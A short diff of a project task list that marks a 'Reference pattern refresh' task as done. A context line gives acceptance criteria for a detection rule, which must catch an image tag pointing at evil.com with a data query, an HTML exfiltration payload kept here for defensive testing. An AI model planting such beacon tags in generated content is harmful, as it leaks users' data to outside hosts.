@@ -1589,7 +1589,7 @@ Note: T-135 (commit grilling outputs) and T-158a (write ADR-0013) were completed
 - **Acceptance:** the new rule catches `<img src="https://evil.com/?data=...">` and equivalents; brand-token-derived URLs pass; all existing rules still pass.
 - **est.** 1h
 
-### T-138 [ ] · Reference pattern refresh
+### T-138 [x] · Reference pattern refresh
 - **Depends-on:** T-139 (needs the `defineBlock` API to exist before patterns can demonstrate it)
 - **Reads:** `docs/adr/0008-block-registry-manifest-shape.md`, `reference/callout/`, `reference/chart/`, `reference/mapping/`
 - **Outputs:**
